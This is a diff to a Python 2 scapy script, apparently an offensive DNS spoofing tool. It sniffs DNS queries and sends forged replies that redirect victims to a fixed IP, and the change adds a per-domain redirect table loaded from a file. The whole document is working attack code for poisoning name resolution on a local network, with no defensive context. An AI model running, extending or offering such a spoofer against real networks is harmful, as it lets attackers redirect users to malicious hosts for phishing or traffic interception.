@@ -2,20 +2,33 @@
 from scapy.all import *
 import netifaces
 import getopt
+import socket
 
 changeToIp = "173.252.89.132"
-dnsQueryDName = "domp.com"
+#changeToIp = netifaces.ifaddresses('eth0')[2][0]['addr']
+print changeToIp
 interface = ""
 filename = ""
 BPFfilter = ""
 domainTable = {}
+fflag = 0
 
 def arp_monitor_callback(pkt):
 	print pkt
-	spfResp = IP(dst=pkt[IP].src, src=pkt[IP].dst)\
-		/UDP(dport=pkt[UDP].sport, sport=53)\
-		/DNS(id=pkt[DNS].id,qr=1L,ancount=1,an=DNSRR(rrname=pkt["DNS Question Record"].qname,rdata=changeToIp)\
-		/DNSRR(rrname=pkt["DNS Question Record"].qname,rdata=changeToIp))
+	print "fflag is ", fflag
+	url = pkt["DNS Question Record"].qname 
+	url = url[:-1]
+	print url
+	if fflag == 1 and url in domainTable:
+		spfResp = IP(dst=pkt[IP].src, src=pkt[IP].dst)\
+			/UDP(dport=pkt[UDP].sport, sport=53)\
+			/DNS(id=pkt[DNS].id,qr=1L,ancount=1,an=DNSRR(rrname=pkt["DNS Question Record"].qname,rdata=domainTable[url])\
+			/DNSRR(rrname=pkt["DNS Question Record"].qname,rdata=changeToIp))
+	else:
+		spfResp = IP(dst=pkt[IP].src, src=pkt[IP].dst)\
+			/UDP(dport=pkt[UDP].sport, sport=53)\
+			/DNS(id=pkt[DNS].id,qr=1L,ancount=1,an=DNSRR(rrname=pkt["DNS Question Record"].qname,rdata=changeToIp)\
+			/DNSRR(rrname=pkt["DNS Question Record"].qname,rdata=changeToIp))
 	send(spfResp,verbose=0)
 	return "Spoofed DNS Response Sent"
 
@@ -34,6 +47,7 @@ BPFfilter = " ".join(str(x) for x in remainder)
 print "interface is ", interface
 
 if len(filename) > 0:
+	fflag = 1
 	print "filename is ", filename
 	with open(filename) as f:
 	    for line in f:
